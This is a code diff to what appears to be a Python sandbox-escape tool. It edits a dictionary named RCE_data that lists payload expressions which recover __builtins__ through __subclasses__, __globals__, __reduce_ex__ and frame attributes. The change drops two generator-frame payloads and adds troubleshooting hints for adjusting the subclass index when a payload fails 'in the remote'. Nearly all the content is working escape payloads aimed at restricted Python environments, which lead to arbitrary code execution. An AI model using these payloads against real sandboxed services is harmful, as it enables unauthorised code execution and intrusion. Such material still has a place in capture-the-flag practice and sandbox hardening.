@@ -157,12 +157,26 @@ RCE_data = {
     "restore_builtins_in_other_ns": [
         ["TYPE.__subclasses__(TYPE)[0].register.__globals__['__builtins__']", "TYPE"],
         ["OBJECT.__reduce_ex__(3)[0].__globals__['__builtins__']", "OBJECT"],
-        ["{}.__class__.__subclasses__()[2].copy.__globals__['__builtins__']", ""],
-        ["dict.__subclasses__()[2].copy.__globals__['__builtins__']", "dict"],
-        ["{}.__class__.__subclasses__()[2].update.__globals__['__builtins__']", ""],
-        ["dict.__subclasses__()[2].update.__globals__['__builtins__']", "dict"],
-        ["GENERATOR.f_back.f_builtins", "GENERATOR"],
-        ["GENERATOR.f_back.f_globals['__builtins__']", "GENERATOR"],
+        [
+            "{}.__class__.__subclasses__()[2].copy.__globals__['__builtins__']",
+            "",
+            "If 'method_descriptor' object has no attribute '__globals__' happens in the remote, change index of the number 2 in {} to 1, 3 or 4.",
+        ],
+        [
+            "dict.__subclasses__()[2].copy.__globals__['__builtins__']",
+            "dict",
+            "If 'method_descriptor' object has no attribute '__globals__' happens in the remote, change index of the number 2 in {} to 1, 3 or 4.",
+        ],
+        [
+            "{}.__class__.__subclasses__()[2].update.__globals__['__builtins__']",
+            "",
+            "If 'method_descriptor' object has no attribute '__globals__' happens in the remote, change index of the number 2 in {} to 1, 3 or 4.",
+        ],
+        [
+            "dict.__subclasses__()[2].update.__globals__['__builtins__']",
+            "dict",
+            "If 'method_descriptor' object has no attribute '__globals__' happens in the remote, change index of the number 2 in {} to 1, 3 or 4.",
+        ],
     ],
     "object": [
         ["BUILTINOBJ.__class__.__bases__[0]", ""],
